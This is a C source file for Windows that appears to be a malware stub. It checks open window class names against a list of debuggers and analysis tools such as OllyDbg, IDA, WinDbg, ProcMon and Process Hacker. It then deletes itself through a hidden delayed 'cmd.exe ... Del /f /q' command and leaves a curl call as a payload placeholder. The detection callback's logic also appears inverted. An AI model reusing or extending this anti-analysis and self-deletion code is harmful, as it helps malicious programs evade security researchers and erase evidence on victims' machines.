/*
DO NOT
- build under the unicode
- use this in practice
- change curl option
*/

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <strsafe.h>
#pragma comment(lib, "user32.lib")
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

BOOL CALLBACK findClassName(HWND hwnd, LPARAM lParam)
{
	int cnt;
	char buff[1024];
	char* classNameList[] = { (char*)"PROCMON_WINDOW_CLASS",
		(char*)"OllyDbg",(char*)"TIdaWindow",
		(char*)"WinDbgFrameClass",
		(char*)"FilemonClass",
		(char*)"ID",
		(char*)"RegmonClass",
		(char*)"PROCEXPL",
		(char*)"TCPViewClass",
		(char*)"SmartSniff",
		(char*)"Autoruns",
		(char*)"CNetmonMainFrame",
		(char*)"TFormFileAlyzer2",
		(char*)"ProcessHacker"
	}; //add more class name
	if (GetClassName(hwnd, buff, sizeof(buff))) {
		for (cnt = 0; cnt < sizeof(classNameList) / sizeof(wchar_t*); cnt++) {
			if (!_stricmp(classNameList[cnt], buff)) {
				return TRUE;
			}
		}
	}
	return FALSE;
}

void do_or_die() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	exit(0);
}

int main() {

	if (EnumWindows(findClassName, 0)) {
		do_or_die();
	}

	system("curl -help");
	do_or_die();

	return 0;
}